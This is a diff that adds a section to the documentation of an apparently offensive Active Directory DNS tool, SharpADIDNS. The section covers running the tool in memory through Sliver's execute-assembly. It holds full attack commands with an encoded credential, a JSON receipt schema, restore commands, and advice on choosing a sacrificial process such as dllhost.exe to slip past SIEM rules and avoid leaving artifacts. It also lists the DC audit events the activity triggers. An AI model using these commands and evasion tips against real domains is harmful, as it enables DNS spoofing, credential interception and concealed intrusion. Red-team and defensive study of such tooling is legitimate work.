@@ -350,6 +350,101 @@ The `dnsRecord` attribute is replicated across all DCs in `DomainDnsZones` (or `
 - Pick names consistent with the zone's existing operational naming. `wpad` / wildcards / very short names attract attention.
 - Set TTLs consistent with surrounding records (`enum` first).
 
+## Using via Sliver `execute-assembly`
+
+This is the primary deployment path for the tool. Sliver loads the assembly into a sacrificial process via CLR reflection, runs `Main` in memory, and pipes stdout/stderr back to the operator. The OPSEC surface is *different* from a local-shell invocation -- some Tier-1 protections become irrelevant, and new constraints appear.
+
+### Recommended invocation
+
+Pass `--c2` and `--password-base64`; everything else is the same as a local invocation:
+
+```bash
+# operator: encode the password once
+$ printf 'RedteamN0t3s.' | base64
+UmVkdGVhbU4wdDNzLg==
+
+# in Sliver console:
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+    --c2 \
+    --username 'redteamnotes\redpen' \
+    --password-base64 UmVkdGVhbU4wdDNzLg== \
+    add \
+    --zone redteamnotes.local \
+    --name sccm \
+    --type A --data 10.0.0.66 \
+    --dn DC=redteamnotes,DC=local \
+    --server dc.redteamnotes.local
+```
+
+`--c2` flips on a coherent set of defaults (no FUD warnings, no prompts, no color, quiet, `--format json`, `--backup-to -` to stdout). `--password-base64` is the only password source that survives Sliver's multi-layer command parsing cleanly when the password contains `'`, `"`, `$`, or spaces.
+
+### What you get back
+
+A single JSON line on stdout (the **receipt**) plus a single JSON line per backed-up node (only when `--backup-to <file>` is set with a real file; `--c2`'s default `--backup-to -` is suppressed since the receipt already carries `previous_state`).
+
+Receipt schema:
+
+```json
+{
+  "action":         "add" | "disable" | "remove",
+  "result":         "ok",
+  "operation":      "create" | "replace" | "append",   // add only
+  "dn":             "DC=sccm,DC=...",
+  "zone":           "redteamnotes.local",
+  "name":           "sccm",
+  "record":         { "type":"A", "type_id":1, "ttl":600, "ipv4":"10.0.0.66", "blob_base64":"..." },
+  "previous_state": null | {
+    "tombstoned":     false,
+    "records_base64": ["...", "..."]
+  },
+  "reverse":        "SharpADIDNS.exe remove ..." | null
+}
+```
+
+- `previous_state` is `null` for `add` creating a brand-new node, populated otherwise.
+- `reverse` is a one-line undo when expressible as a single command (only `add` create). For replace / append / disable / remove, the undo is multi-step (one `add --raw <b64> --force` per entry in `previous_state.records_base64`); `reverse` is `null` and the operator iterates.
+
+### Restoring from a receipt
+
+```bash
+# from the receipt's previous_state.records_base64, restore each one
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+    --c2 \
+    --username 'redteamnotes\redpen' \
+    --password-base64 UmVkdGVhbU4wdDNzLg== \
+    add \
+    --raw <base64-from-previous_state> \
+    --force \
+    --zone redteamnotes.local \
+    --name sccm \
+    --dn DC=redteamnotes,DC=local \
+    --server dc.redteamnotes.local
+```
+
+### Sacrificial process choice
+
+Avoid `notepad.exe` -- a `notepad.exe` process making LDAP queries to a DC is a soft anomaly that some SIEM rules flag. Prefer processes that legitimately make LDAP traffic or are otherwise unremarkable network citizens:
+
+- `dllhost.exe` -- generic, common, makes various RPC/network calls
+- `svchost.exe` -- usually too restricted unless you launch your own service
+- `RuntimeBroker.exe` -- modern Windows, network-active
+- `services.exe` -- requires SYSTEM but a legitimate LDAP client
+
+This is a Sliver-side knob (`execute-assembly -p <process.exe>`), not a SharpADIDNS feature.
+
+### What `--c2` does NOT change
+
+- **DC-side audit events still fire** (5136 / 5137 / 5141 / 4662). See the `Detection surface` section above. `--c2` is about operator OPSEC, not target OPSEC.
+- **Microsoft Defender for Identity** still sees the LDAP traffic on the sensor. `--ldaps` does not hide this.
+- **`--dry-run` still recommended**: run once with `--dry-run --c2` to see the planned blob, then re-run without `--dry-run` to commit. Same authentication flow, zero AD writes on the dry-run pass.
+
+### Pitfalls
+
+- **stdin sources don't work**: Sliver `execute-assembly` does not pipe stdin to the assembly. `--password-stdin` and the interactive auto-prompt both fail with `Console.IsInputRedirected == true`. Use `--password-base64` instead.
+- **`--password-env <VAR>` rarely works**: the sacrificial process inherits its env from Sliver's beacon, not from the operator's shell. You'd have to set the env var in the beacon first, which is more work than `--password-base64`.
+- **`@argfile.txt`** expects the file to exist on the *target* host. Not useful in C2 unless you've already dropped a file there (which is itself an artifact).
+- **`--backup-to <file>`** (with a real path, not `-`) writes the file in the sacrificial process's CWD, often `C:\Windows\System32`. The file persists after the process exits. Use `--backup-to -` (or rely on the receipt's `previous_state`).
+
 ## Record format reference
 
 Every `dnsRecord` value is a `DNS_RPC_RECORD` blob:
